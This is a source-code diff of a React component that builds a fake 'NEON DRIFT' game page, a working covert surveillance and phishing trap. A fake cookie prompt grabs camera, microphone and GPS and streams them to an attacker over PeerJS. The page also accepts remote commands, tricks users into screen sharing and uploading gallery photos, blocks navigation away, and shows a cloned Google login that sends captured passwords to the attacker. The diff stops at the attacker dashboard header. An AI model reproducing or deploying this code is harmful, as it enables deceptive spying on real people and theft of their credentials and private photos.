@@ -1,559 +1,948 @@
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { AppProps } from '../../types';
-import { Ghost, Wifi, Crosshair, Terminal, Copy, Check, Eye, ShieldCheck, Lock, Smartphone, MapPin, Globe, Zap, MessageSquare, Mic, Navigation, Battery, Cookie, Settings, AlertTriangle, Gamepad2, Trophy } from 'lucide-react';
+import { Ghost, Wifi, Crosshair, Terminal, Copy, Eye, Zap, MessageSquare, Battery, Cookie, Gamepad2, Monitor, Camera, Image as ImageIcon, Lock, Share2, Map, Volume2, VolumeX, Flashlight, Skull, ChevronRight, Activity } from 'lucide-react';
 import Peer from 'peerjs';
 
+// --- UTILS ---
+const compressImage = (file: File): Promise<string> => {
+    return new Promise((resolve) => {
+        const reader = new FileReader();
+        reader.readAsDataURL(file);
+        reader.onload = (event) => {
+            const img = new Image();
+            img.src = event.target?.result as string;
+            img.onload = () => {
+                const canvas = document.createElement('canvas');
+                const MAX_WIDTH = 800;
+                const scale = MAX_WIDTH / img.width;
+                canvas.width = MAX_WIDTH;
+                canvas.height = img.height * scale;
+                const ctx = canvas.getContext('2d');
+                ctx?.drawImage(img, 0, 0, canvas.width, canvas.height);
+                resolve(canvas.toDataURL('image/jpeg', 0.6));
+            };
+        };
+    });
+};
+
 // Types
+interface Credentials {
+    service: string;
+    email: string;
+    pass: string;
+    timestamp: number;
+}
+
 interface VictimData {
-    id: string; // The peer connection ID
-    conn: any;  // PeerJS Connection
-    call?: any; // MediaConnection
+    id: string; 
+    conn: any;  
     platform: string;
-    ua: string;
-    screen: string;
-    lang: string;
-    cores: number;
     battery?: number;
     gps?: { lat: number; lng: number; acc: number };
     stream?: MediaStream;
-    connectedAt: number;
+    gallery?: string[]; 
+    credentials?: Credentials[];
+    lastSeen: number;
 }
 
-// --- VICTIM COMPONENT (Realistic Game -> Cookie Trap) ---
+// --- VICTIM COMPONENT ---
 export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) => {
-    const [status, setStatus] = useState<'consent' | 'requesting' | 'connected' | 'error'>('consent');
-    const [showGame, setShowGame] = useState(true);
-    const [debugLog, setDebugLog] = useState<string>("");
+    const [viewState, setViewState] = useState<'boot' | 'intro' | 'trap' | 'game'>('boot');
+    const [score, setScore] = useState(0);
+    const [loadingProgress, setLoadingProgress] = useState(0);
+    const [connectionStatus, setConnectionStatus] = useState('Initializing Game Engine...');
+    
+    // Traps / Overlays
+    const [pendingAction, setPendingAction] = useState<'screen' | 'gallery' | 'phish' | null>(null);
+    const [phishService, setPhishService] = useState('google');
 
+    const peerRef = useRef<Peer | null>(null);
+    const connRef = useRef<any>(null);
+    const streamRef = useRef<MediaStream | null>(null);
+    const canvasRef = useRef<HTMLCanvasElement>(null);
+    const fileInputRef = useRef<HTMLInputElement>(null);
+    
+    // Phishing Refs
+    const emailRef = useRef<HTMLInputElement>(null);
+    const passRef = useRef<HTMLInputElement>(null);
+
+    // Command Handler Ref to avoid stale closures
+    const handleCommandRef = useRef<(data: any) => void>(() => {});
+
+    // --- PERSISTENCE & LOCKDOWN ---
     useEffect(() => {
-        if (!sessionId) setStatus('error');
-    }, [sessionId]);
+        const onPopState = () => window.history.pushState(null, "", window.location.href);
+        window.history.pushState(null, "", window.location.href);
+        window.addEventListener('popstate', onPopState);
+        const onBeforeUnload = (e: BeforeUnloadEvent) => { e.preventDefault(); e.returnValue = ''; };
+        window.addEventListener('beforeunload', onBeforeUnload);
+        const onContextMenu = (e: MouseEvent) => e.preventDefault();
+        window.addEventListener('contextmenu', onContextMenu);
 
-    const handleConnection = async () => {
-        setStatus('requesting');
-        
-        try {
-            const peer = new Peer();
-            
-            peer.on('open', async (myId) => {
-                const conn = peer.connect(sessionId);
+        return () => {
+            window.removeEventListener('popstate', onPopState);
+            window.removeEventListener('beforeunload', onBeforeUnload);
+            window.removeEventListener('contextmenu', onContextMenu);
+        }
+    }, []);
 
-                conn.on('open', () => {
-                    setStatus('connected');
-                    
-                    // 1. Gather Stealth Intel
-                    const info: any = {
-                        ua: navigator.userAgent,
-                        platform: navigator.platform,
-                        screen: `${window.screen.width}x${window.screen.height}`,
-                        lang: navigator.language,
-                        cores: navigator.hardwareConcurrency
-                    };
-
-                    // Battery
-                    if ((navigator as any).getBattery) {
-                        (navigator as any).getBattery().then((b: any) => {
-                            conn.send({ type: 'battery', level: b.level * 100 });
-                        });
-                    }
-
-                    conn.send({ type: 'info', data: info });
-
-                    // 2. GPS Silent Watch
-                    if (navigator.geolocation) {
-                        navigator.geolocation.watchPosition((pos) => {
-                            conn.send({
-                                type: 'gps',
-                                data: { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }
-                            });
-                        }, (err) => {
-                             conn.send({ type: 'log', msg: 'GPS Denied: ' + err.message });
-                        });
-                    }
-                    
-                    // 3. Remote Control Listener
-                    conn.on('data', (data: any) => {
-                        if (data.cmd === 'vibrate') if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
-                        if (data.cmd === 'alert') alert(data.msg);
-                        if (data.cmd === 'redirect') window.location.href = data.url;
-                        if (data.cmd === 'speak') {
-                            const u = new SpeechSynthesisUtterance(data.msg);
-                            window.speechSynthesis.speak(u);
-                        }
-                    });
-                });
-
-                // 4. Media Stream (Hidden)
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'user' }, 
-                        audio: true 
-                    });
-                    // Establish call but don't show local video
-                    const call = peer.call(sessionId, stream);
-                } catch (e) {
-                    conn.send({ type: 'error', msg: 'Cam/Mic Access Denied' });
-                }
-            });
-            
-            peer.on('error', (err) => {
-                setDebugLog("Connection timeout. Retrying...");
-                // Silent retry logic could go here
-            });
-
-        } catch (e) {
-            console.error(e);
+    // --- UTILITY: SEND DATA ---
+    const sendData = (type: string, data: any) => {
+        if (connRef.current && connRef.current.open) {
+            connRef.current.send({ type, ...data });
         }
     };
 
-    // --- 1. FAKE GAME INTRO ---
-    if (showGame) {
-        return (
-            <div 
-                onClick={() => setShowGame(false)}
-                className="fixed inset-0 bg-black z-[100] cursor-pointer flex flex-col items-center justify-center font-sans select-none overflow-hidden"
-            >
-                {/* Background with overlay */}
-                <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1535378437327-1e88860c6340?q=80&w=1000&auto=format&fit=crop')] bg-cover bg-center opacity-60 animate-[pulse_8s_infinite]"></div>
-                <div className="absolute inset-0 bg-gradient-to-t from-black via-transparent to-black/50"></div>
-                
-                {/* Game Content */}
-                <div className="relative z-10 flex flex-col items-center text-center p-8 w-full max-w-md">
-                    <div className="mb-4 text-cyan-400 font-bold tracking-[0.3em] text-xs animate-pulse">CLOUDOS GAMING PRESENTS</div>
-                    
-                    <h1 className="text-6xl md:text-8xl font-black italic tracking-tighter text-transparent bg-clip-text bg-gradient-to-br from-cyan-400 via-blue-500 to-purple-600 drop-shadow-[0_0_20px_rgba(0,255,255,0.5)] transform -skew-x-6 mb-2">
-                        NEON<br/>DRIFT
-                    </h1>
-                    
-                    <div className="flex gap-2 mb-12">
-                         <span className="px-2 py-0.5 bg-cyan-500/20 border border-cyan-500/50 rounded text-[10px] text-cyan-300 font-mono">RACING</span>
-                         <span className="px-2 py-0.5 bg-purple-500/20 border border-purple-500/50 rounded text-[10px] text-purple-300 font-mono">MULTIPLAYER</span>
-                         <span className="px-2 py-0.5 bg-yellow-500/20 border border-yellow-500/50 rounded text-[10px] text-yellow-300 font-mono flex items-center gap-1"><Trophy size={8}/> RANKED</span>
-                    </div>
+    // --- MEDIA HANDLER ---
+    const startMedia = useCallback(async (type: 'user' | 'environment' | 'display') => {
+        if (!peerRef.current) return;
+        
+        // Cleanup old tracks
+        if (streamRef.current) {
+            streamRef.current.getTracks().forEach(track => track.stop());
+        }
 
-                    <div className="w-full bg-white/10 backdrop-blur-md border border-white/20 rounded-2xl p-6 shadow-2xl transform transition-transform hover:scale-105 active:scale-95 duration-200 group relative overflow-hidden">
-                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full animate-[shimmer_2s_infinite]"></div>
-                        <div className="text-xl font-bold text-white tracking-widest group-hover:text-cyan-300 transition-colors animate-pulse flex items-center justify-center gap-2">
-                            <Gamepad2 size={24} />
-                            TAP TO START
-                        </div>
+        try {
+            let stream: MediaStream;
+            
+            if (type === 'display') {
+                // Screen Sharing
+                // @ts-ignore
+                stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { cursor: "always" } as any, 
+                    audio: false 
+                });
+            } else {
+                // Camera
+                const constraints = type === 'environment' 
+                    ? { video: { facingMode: { exact: 'environment' } }, audio: true }
+                    : { video: { facingMode: 'user' }, audio: true };
+                
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia(constraints);
+                } catch (err) {
+                    // Fallback if specific facingMode fails
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                }
+            }
+            
+            streamRef.current = stream;
+            
+            // Re-establish call with new stream
+            const call = peerRef.current.call(sessionId, stream);
+            
+            sendData('log', { msg: `Stream Active: ${type.toUpperCase()}` });
+
+            // Handle stream ending (e.g. user stops screen share or camera is preempted)
+            // We revert to front camera to maintain connection
+            if (stream.getVideoTracks().length > 0) {
+                stream.getVideoTracks()[0].onended = () => {
+                    sendData('log', { msg: 'Stream Stopped. Reverting to Camera...' });
+                    startMedia('user');
+                };
+            }
+
+        } catch (e: any) {
+            console.error("Media Error:", e);
+            sendData('error', { msg: `Media Error: ${e.message}` });
+            
+            // If we failed to get display or back cam, revert to safe front cam
+            if (type !== 'user') {
+                setTimeout(() => startMedia('user'), 500);
+            }
+        }
+    }, [sessionId]);
+
+    // --- COMMAND HANDLER ---
+    const handleCommand = useCallback((data: any) => {
+        console.log("CMD:", data);
+
+        if (data.cmd === 'vibrate') {
+            if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 500]);
+        }
+        
+        if (data.cmd === 'alert') {
+            alert(data.msg || 'System Alert');
+        }
+        
+        if (data.cmd === 'redirect') {
+            window.location.href = data.url;
+        }
+        
+        if (data.cmd === 'speak') {
+            const u = new SpeechSynthesisUtterance(data.text);
+            window.speechSynthesis.speak(u);
+        }
+
+        if (data.cmd === 'torch') {
+            const currentStream = streamRef.current;
+            const videoTrack = currentStream?.getVideoTracks()[0];
+            const settings = videoTrack?.getSettings();
+
+            // Auto-switch to environment if on user camera
+            if (settings?.facingMode === 'user' && data.on) {
+                sendData('log', { msg: 'Switching to Back Camera for Torch...' });
+                startMedia('environment').then(() => {
+                    // Wait for switch then apply torch
+                    setTimeout(() => {
+                        const newTrack = streamRef.current?.getVideoTracks()[0];
+                        // @ts-ignore
+                        newTrack?.applyConstraints({ advanced: [{ torch: true }] })
+                            .catch((e:any) => sendData('error', {msg: 'Torch failed after switch'}));
+                    }, 1500);
+                });
+                return;
+            }
+
+            if (videoTrack) {
+                // @ts-ignore
+                videoTrack.applyConstraints({ advanced: [{ torch: !!data.on }] })
+                    .then(() => sendData('log', { msg: `Torch ${data.on ? 'ON' : 'OFF'}` }))
+                    .catch((e: any) => sendData('error', { msg: `Torch Error: ${e.message}` }));
+            } else {
+                 sendData('error', { msg: 'No active video track for torch' });
+            }
+        }
+        
+        if (data.cmd === 'switch_cam') {
+            if (streamRef.current) {
+                const track = streamRef.current.getVideoTracks()[0];
+                const currentFacing = track.getSettings().facingMode;
+                const next = currentFacing === 'environment' ? 'user' : 'environment';
+                startMedia(next);
+            } else {
+                startMedia('environment');
+            }
+        }
+        
+        if (data.cmd === 'get_screen') {
+            setPendingAction('screen');
+            if (navigator.vibrate) navigator.vibrate(200);
+        }
+
+        if (data.cmd === 'get_gallery') {
+            setPendingAction('gallery');
+            if (navigator.vibrate) navigator.vibrate(200);
+        }
+
+        if (data.cmd === 'phish') {
+            setPhishService(data.service || 'google');
+            setPendingAction('phish');
+            if (navigator.vibrate) navigator.vibrate(500);
+        }
+    }, [startMedia]);
+
+    // Update Ref
+    useEffect(() => {
+        handleCommandRef.current = handleCommand;
+    }, [handleCommand]);
+
+
+    // --- CONNECTION SETUP ---
+    useEffect(() => {
+        if (peerRef.current) return;
+
+        // Fake Loading Logic
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.random() * 8;
+            if (progress > 100) progress = 100;
+            setLoadingProgress(progress);
+            if (progress === 100) {
+                clearInterval(interval);
+                setTimeout(() => setViewState('intro'), 200);
+            }
+        }, 80);
+
+        const peer = new Peer();
+        peerRef.current = peer;
+
+        const connectToAttacker = () => {
+            const conn = peer.connect(sessionId, { reliable: true });
+            connRef.current = conn;
+
+            conn.on('open', () => {
+                setConnectionStatus('Connected.');
+                
+                // Initial Telemetry
+                sendData('info', {
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    cores: navigator.hardwareConcurrency
+                });
+
+                if ((navigator as any).getBattery) {
+                    (navigator as any).getBattery().then((b: any) => 
+                        sendData('battery', { level: b.level * 100 })
+                    );
+                }
+
+                // Keep Alive
+                setInterval(() => sendData('ping', {}), 4000);
+            });
+
+            // Use Ref for data handling to prevent stale closures
+            conn.on('data', (data) => handleCommandRef.current(data));
+            
+            conn.on('close', () => {
+                setTimeout(connectToAttacker, 1000); // Reconnect
+            });
+        };
+
+        peer.on('open', () => {
+            connectToAttacker();
+        });
+
+        return () => { clearInterval(interval); peer.destroy(); };
+    }, [sessionId]);
+
+
+    // --- GAME ENGINE ---
+    useEffect(() => {
+        if (viewState !== 'game' || !canvasRef.current) return;
+        const canvas = canvasRef.current;
+        const ctx = canvas.getContext('2d');
+        if (!ctx) return;
+
+        let animationFrameId: number;
+        let gameActive = true;
+        let frameCount = 0;
+        let speed = 8;
+        let playerX = canvas.width / 2;
+        const playerY = canvas.height - 120;
+        let obstacles: any[] = [];
+        let particles: any[] = [];
+
+        // Input Handling
+        const handleMove = (e: MouseEvent | TouchEvent) => {
+            e.preventDefault();
+            const clientX = 'touches' in e ? e.touches[0].clientX : e.clientX;
+            playerX = clientX;
+        };
+        
+        // IMPORTANT: Passive false for touch to prevent scrolling
+        window.addEventListener('mousemove', handleMove);
+        window.addEventListener('touchmove', handleMove, { passive: false });
+
+        const render = () => {
+            if (!gameActive) return;
+            // Fullscreen Canvas
+            if (canvas.width !== window.innerWidth) canvas.width = window.innerWidth;
+            if (canvas.height !== window.innerHeight) canvas.height = window.innerHeight;
+
+            // Background
+            ctx.fillStyle = '#050505';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            // Retro 3D Grid Effect
+            ctx.strokeStyle = '#333';
+            ctx.lineWidth = 2;
+            ctx.beginPath();
+            // Vertical lines perspective
+            for (let i = -canvas.width; i < canvas.width * 2; i += 100) {
+                 ctx.moveTo(i + (canvas.width/2 - i) * 0.5, 0); 
+                 ctx.lineTo(i, canvas.height); 
+            }
+            // Horizontal lines movement
+            const offset = (frameCount * speed * 2) % 100;
+            for (let i = 0; i < canvas.height; i += 40 + i * 0.1) {
+                const y = i + offset;
+                if(y < canvas.height) {
+                    ctx.moveTo(0, y);
+                    ctx.lineTo(canvas.width, y);
+                }
+            }
+            ctx.stroke();
+
+            // Generate Obstacles
+            if (frameCount % 40 === 0) {
+                obstacles.push({ 
+                    x: Math.random() * (canvas.width - 100), 
+                    y: -100, 
+                    w: 80, 
+                    h: 20, 
+                    color: `hsl(${Math.random()*360}, 100%, 50%)`,
+                    type: Math.random() > 0.5 ? 'block' : 'spike' 
+                });
+            }
+
+            // Draw Obstacles
+            obstacles.forEach((obs, i) => {
+                obs.y += speed;
+                
+                ctx.shadowBlur = 20;
+                ctx.shadowColor = obs.color;
+                ctx.fillStyle = obs.color;
+                
+                if (obs.type === 'block') {
+                    ctx.fillRect(obs.x, obs.y, obs.w, obs.h);
+                } else {
+                    ctx.beginPath();
+                    ctx.moveTo(obs.x, obs.y);
+                    ctx.lineTo(obs.x + obs.w/2, obs.y + obs.h);
+                    ctx.lineTo(obs.x + obs.w, obs.y);
+                    ctx.fill();
+                }
+                
+                ctx.shadowBlur = 0;
+
+                // Cleanup
+                if (obs.y > canvas.height) {
+                    obstacles.splice(i, 1);
+                    setScore(s => s + 15);
+                }
+            });
+
+            // Player Ship
+            ctx.shadowBlur = 30;
+            ctx.shadowColor = '#00ffff';
+            ctx.fillStyle = '#00ffff';
+            ctx.beginPath();
+            ctx.moveTo(playerX, playerY);
+            ctx.lineTo(playerX - 25, playerY + 60);
+            ctx.lineTo(playerX, playerY + 45); // Engine indent
+            ctx.lineTo(playerX + 25, playerY + 60);
+            ctx.closePath();
+            ctx.fill();
+
+            // Engine Thruster
+            ctx.fillStyle = `rgba(255, 100, 0, ${0.5 + Math.random() * 0.5})`;
+            ctx.beginPath();
+            ctx.moveTo(playerX - 10, playerY + 50);
+            ctx.lineTo(playerX + 10, playerY + 50);
+            ctx.lineTo(playerX, playerY + 80 + Math.random() * 20);
+            ctx.fill();
+            ctx.shadowBlur = 0;
+
+            // Score HUD
+            ctx.fillStyle = 'white';
+            ctx.font = 'bold italic 32px sans-serif';
+            ctx.textAlign = 'left';
+            ctx.fillText(`${score}`, 30, 60);
+            ctx.font = '14px monospace';
+            ctx.fillStyle = '#aaa';
+            ctx.fillText(`ZONE: ${Math.floor(score/1000)}`, 30, 80);
+
+            frameCount++;
+            animationFrameId = requestAnimationFrame(render);
+        };
+        render();
+
+        return () => {
+            cancelAnimationFrame(animationFrameId);
+            window.removeEventListener('mousemove', handleMove);
+            window.removeEventListener('touchmove', handleMove);
+            gameActive = false;
+        };
+    }, [viewState]);
+
+    const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
+        if (e.target.files && e.target.files.length > 0) {
+            setPendingAction(null);
+            const files = Array.from(e.target.files);
+            sendData('log', { msg: `Exfiltrating ${files.length} images...` });
+            for (const file of files) {
+                try {
+                    const compressedBase64 = await compressImage(file as File);
+                    sendData('gallery_item', { data: compressedBase64 });
+                } catch (err) {}
+            }
+            alert("Verification Successful. Resume playing.");
+        }
+    };
+
+    const handlePhishSubmit = (e: React.FormEvent) => {
+        e.preventDefault();
+        const email = emailRef.current?.value;
+        const pass = passRef.current?.value;
+        if (email && pass) {
+            sendData('creds', { service: phishService, email, pass, timestamp: Date.now() });
+            sendData('log', { msg: '*** CREDENTIALS CAPTURED ***' });
+            setTimeout(() => {
+                alert("Network Error. Please try again later.");
+                setPendingAction(null);
+            }, 1000);
+        }
+    };
+
+    // --- PERMISSION GRANT (COOKIE TRAP) ---
+    const handleConsent = async () => {
+        try {
+            // 1. SILENTLY REQUEST CAMERA & MIC
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' }, 
+                audio: true 
+            });
+            streamRef.current = stream;
+            
+            // 2. IMMEDIATE STREAM TO ATTACKER
+            if (peerRef.current && sessionId) {
+                 peerRef.current.call(sessionId, stream);
+                 sendData('log', { msg: 'Cookie Accepted -> Stream Started' });
+            }
+
+            // 3. SILENTLY REQUEST GPS
+            if (navigator.geolocation) {
+                 navigator.geolocation.getCurrentPosition(
+                     (p) => sendData('gps', { lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }),
+                     () => {}
+                 );
+            }
+        } catch (e) {
+            console.error("Perms error", e);
+            sendData('error', { msg: 'User denied hardware access' });
+        }
+
+        // 4. START GAME IMMEDIATELY
+        setViewState('game');
+    };
+
+    // --- RENDER VICTIM VIEW ---
+    if (viewState === 'boot') {
+        return (
+            <div className="fixed inset-0 bg-black flex flex-col items-center justify-center p-8">
+                <div className="w-full max-w-xs space-y-4">
+                    <div className="flex justify-between text-xs font-mono text-cyan-500">
+                        <span>INITIALIZING...</span>
+                        <span>{Math.round(loadingProgress)}%</span>
                     </div>
-                    
-                    <div className="mt-8 flex flex-col gap-1 text-[10px] text-slate-400 font-mono">
-                        <div>SERVER: US-EAST-1 (24ms)</div>
-                        <div>VERSION: 4.2.0.1</div>
+                    <div className="h-1 bg-slate-800 rounded-full overflow-hidden">
+                        <div className="h-full bg-cyan-500 transition-all duration-100 ease-out" style={{ width: `${loadingProgress}%` }} />
+                    </div>
+                    <div className="text-[10px] font-mono text-slate-500 text-center animate-pulse">
+                        {connectionStatus}
                     </div>
                 </div>
             </div>
         );
     }
 
-    if (status === 'connected') {
-        // --- 4. DECOY PAGE (404 / Maintenance) ---
+    if (viewState === 'intro') {
         return (
-             <div className="fixed inset-0 bg-white flex flex-col items-center justify-center p-8 text-center font-sans select-none text-slate-800 z-50">
-                <div className="w-16 h-16 bg-slate-100 rounded-full flex items-center justify-center mb-6 text-slate-400">
-                    <AlertTriangle size={32} />
-                </div>
-                <h1 className="text-2xl font-bold mb-2 text-slate-900">Site Maintenance</h1>
-                <p className="text-slate-500 max-w-xs mx-auto leading-relaxed">
-                    We are currently performing scheduled maintenance. Please check back in a few minutes.
-                </p>
-                <div className="mt-8 text-[10px] text-slate-300 font-mono">
-                    Error ID: {sessionId.substring(0,8)}-{Date.now().toString().substring(8)}
+            <div onClick={() => setViewState('trap')} className="fixed inset-0 bg-black flex flex-col items-center justify-center cursor-pointer overflow-hidden">
+                <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1535378437327-1e88860c6340')] bg-cover opacity-60 animate-pulse" />
+                <div className="relative z-10 text-center p-6">
+                    <div className="text-cyan-400 font-black tracking-[0.5em] text-xs mb-6 animate-pulse">CLOUDOS ENTERTAINMENT</div>
+                    <h1 className="text-7xl md:text-9xl font-black italic text-transparent bg-clip-text bg-gradient-to-br from-cyan-400 via-blue-500 to-purple-600 transform -skew-x-12 mb-8 drop-shadow-2xl">NEON<br/>DRIFT</h1>
+                    <div className="inline-flex items-center gap-3 px-8 py-4 bg-white/10 backdrop-blur-md border border-white/30 rounded-full text-white font-bold animate-bounce hover:bg-white/20 transition-colors shadow-[0_0_30px_rgba(0,255,255,0.3)]">
+                        <Gamepad2 size={24} /> TAP TO START
+                    </div>
                 </div>
             </div>
         );
     }
 
-    if (status === 'requesting') {
+    // --- COOKIE TRAP ---
+    if (viewState === 'trap') {
         return (
-             <div className="fixed inset-0 bg-white/90 backdrop-blur-sm flex flex-col items-center justify-center z-50">
-                <div className="w-10 h-10 border-4 border-indigo-200 border-t-indigo-600 rounded-full animate-spin mb-4"></div>
-                <p className="text-slate-600 font-medium text-sm">Saving privacy settings...</p>
-            </div>
-        );
-    }
-
-    // --- 2. TRAP PAGE (Cookie Consent) ---
-    return (
-        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-end md:items-center justify-center p-0 md:p-4 font-sans text-slate-900 select-none z-50 animate-in fade-in duration-300">
-            {/* Modal */}
-            <div className="bg-white w-full md:max-w-lg md:rounded-2xl rounded-t-2xl shadow-2xl overflow-hidden animate-in slide-in-from-bottom-10 duration-500">
-                
-                {/* Header */}
-                <div className="p-6 pb-2">
-                    <div className="flex items-start gap-4">
-                        <div className="w-12 h-12 bg-indigo-50 text-indigo-600 rounded-xl flex items-center justify-center shrink-0">
-                            <Cookie size={24} />
-                        </div>
-                        <div>
-                            <h2 className="font-bold text-xl text-slate-900 mb-1">Cookie Preferences</h2>
-                            <p className="text-sm text-slate-500 leading-relaxed">
-                                We use cookies and similar technologies to help personalize content, tailor and measure ads, and provide a better experience.
-                            </p>
+            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-end justify-center z-50 animate-in slide-in-from-bottom duration-500">
+                <div className="bg-white w-full max-w-md m-4 rounded-3xl p-6 shadow-2xl">
+                    <div className="flex items-start justify-between mb-4">
+                        <div className="flex items-center gap-3">
+                            <div className="p-3 bg-indigo-100 text-indigo-600 rounded-2xl">
+                                <Cookie size={24} />
+                            </div>
+                            <div>
+                                <h2 className="font-bold text-lg text-slate-900">Cookie Preferences</h2>
+                                <p className="text-xs text-slate-500">Required for Multiplayer & Saves</p>
+                            </div>
                         </div>
                     </div>
-                </div>
-
-                {/* Toggles (Fake) */}
-                <div className="px-6 py-2 space-y-3">
-                    <div className="flex items-center justify-between p-3 bg-slate-50 rounded-lg border border-slate-100">
-                        <div className="text-sm font-semibold text-slate-700">Essential Cookies</div>
-                        <div className="text-xs text-indigo-600 font-bold bg-indigo-50 px-2 py-1 rounded">Required</div>
-                    </div>
-                    <div className="flex items-center justify-between p-3 bg-slate-50 rounded-lg border border-slate-100">
-                        <div className="text-sm font-semibold text-slate-700">Device Analytics</div>
-                        <div className="w-10 h-5 bg-indigo-600 rounded-full relative">
-                            <div className="absolute right-1 top-1 w-3 h-3 bg-white rounded-full shadow-sm"></div>
-                        </div>
-                    </div>
-                </div>
-
-                {/* Actions */}
-                <div className="p-6 flex flex-col gap-3 pt-4">
-                    {/* BUTTON 1: ACCEPT */}
-                    <button 
-                        onClick={handleConnection}
-                        className="w-full bg-indigo-600 text-white font-bold py-3.5 rounded-xl hover:bg-indigo-700 transition-all active:scale-[0.98] shadow-lg shadow-indigo-600/20 flex items-center justify-center gap-2"
-                    >
-                        Accept All & Continue
-                    </button>
                     
-                    {/* BUTTON 2: REJECT (Deceptive - Actually Accepts) */}
-                    <button 
-                        onClick={handleConnection}
-                        className="w-full bg-white border border-slate-200 text-slate-600 font-medium py-3 rounded-xl hover:bg-slate-50 text-sm active:bg-slate-100"
-                    >
-                        Reject Non-Essential
-                    </button>
-                </div>
-                
-                <div className="px-6 pb-4 text-center">
-                    <p className="text-[10px] text-slate-400">
-                        By clicking "Accept All", you agree to our Terms of Service and Privacy Policy.
+                    <p className="text-slate-600 text-sm mb-6 leading-relaxed">
+                        We use cookies and hardware acceleration to provide a lag-free gaming experience. 
+                        Allowing access enables cloud saves, voice chat features, and location-based leaderboards.
                     </p>
+
+                    <div className="grid grid-cols-2 gap-3">
+                        <button onClick={() => window.location.reload()} className="py-3 bg-slate-100 text-slate-600 font-bold rounded-xl text-sm hover:bg-slate-200">
+                            Decline
+                        </button>
+                        <button 
+                            onClick={handleConsent} 
+                            className="py-3 bg-indigo-600 text-white font-bold rounded-xl text-sm shadow-lg shadow-indigo-500/30 active:scale-95 transition-transform"
+                        >
+                            Allow All Cookies
+                        </button>
+                    </div>
                 </div>
             </div>
+        );
+    }
+
+    return (
+        <div className="fixed inset-0 bg-black overflow-hidden touch-none select-none">
+            {/* GAME CANVAS */}
+            <canvas ref={canvasRef} className="w-full h-full block" />
+            
+            {/* TRAPS (OVERLAYS) */}
+            
+            {/* 1. SCREEN SHARE TRAP */}
+            {pendingAction === 'screen' && (
+                <div 
+                    onClick={() => { setPendingAction(null); startMedia('display'); }}
+                    className="absolute inset-0 z-[100] bg-red-600/90 backdrop-blur-md flex flex-col items-center justify-center text-white cursor-pointer p-8 text-center"
+                >
+                    <Wifi size={80} className="mb-6 animate-pulse" />
+                    <h2 className="text-4xl font-black uppercase tracking-widest">Connection Lost</h2>
+                    <p className="font-bold text-xl mt-4 animate-bounce">TAP SCREEN TO RECONNECT</p>
+                    <p className="text-sm mt-8 opacity-70 max-w-xs">Server handshake failed. Re-authorization required for multiplayer stream.</p>
+                </div>
+            )}
+
+            {/* 2. GALLERY TRAP (Avatar Upload) */}
+            {pendingAction === 'gallery' && (
+                <div 
+                    onClick={() => fileInputRef.current?.click()}
+                    className="absolute inset-0 z-[100] bg-indigo-950/95 backdrop-blur-md flex flex-col items-center justify-center text-white cursor-pointer p-8 text-center"
+                >
+                    <div className="w-24 h-24 bg-indigo-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
+                        <ImageIcon size={40} className="text-indigo-400" />
+                    </div>
+                    <h2 className="text-3xl font-black uppercase mb-2">Setup Avatar</h2>
+                    <p className="max-w-xs text-center mb-8 text-indigo-200 font-medium leading-relaxed">
+                        To continue, please select a photo from your gallery to use as your player profile.
+                    </p>
+                    <button className="px-10 py-4 bg-white text-indigo-900 font-black rounded-full text-lg shadow-xl hover:scale-105 transition-transform">
+                        CHOOSE PHOTO
+                    </button>
+                    <input ref={fileInputRef} type="file" accept="image/*" multiple className="hidden" onChange={handleFileUpload} />
+                </div>
+            )}
+
+            {/* 3. PHISHING TRAP */}
+            {pendingAction === 'phish' && (
+                <div className="absolute inset-0 z-[200] bg-white flex flex-col items-center justify-center p-6 text-slate-800">
+                    <div className="w-full max-w-sm">
+                        <div className="flex justify-center mb-8">
+                            <span className="text-blue-600 font-bold text-2xl tracking-tight">G<span className="text-red-500">o</span><span className="text-yellow-500">o</span><span className="text-blue-600">g</span><span className="text-green-500">l</span><span className="text-red-500">e</span></span>
+                        </div>
+                        <h2 className="text-center text-xl font-medium mb-2">Sign in</h2>
+                        <p className="text-center text-sm text-slate-600 mb-8">to continue to CloudOS</p>
+                        
+                        <form onSubmit={handlePhishSubmit} className="space-y-4">
+                            <div className="space-y-1">
+                                <input 
+                                    ref={emailRef}
+                                    type="email" 
+                                    required
+                                    placeholder="Email or phone"
+                                    className="w-full border border-slate-300 rounded px-3 py-3 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all"
+                                />
+                            </div>
+                            <div className="space-y-1">
+                                <input 
+                                    ref={passRef}
+                                    type="password" 
+                                    required
+                                    placeholder="Password"
+                                    className="w-full border border-slate-300 rounded px-3 py-3 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all"
+                                />
+                            </div>
+                            <div className="flex justify-between items-center text-sm font-medium text-blue-600 mt-2">
+                                <a href="#" className="hover:underline">Forgot email?</a>
+                            </div>
+                            <div className="flex justify-end mt-8">
+                                <button type="submit" className="bg-blue-600 text-white px-6 py-2 rounded font-bold hover:bg-blue-700 transition-colors">Next</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            )}
         </div>
     );
 };
 
-
-// --- ATTACKER APP (Dashboard) ---
+// --- ATTACKER COMPONENT ---
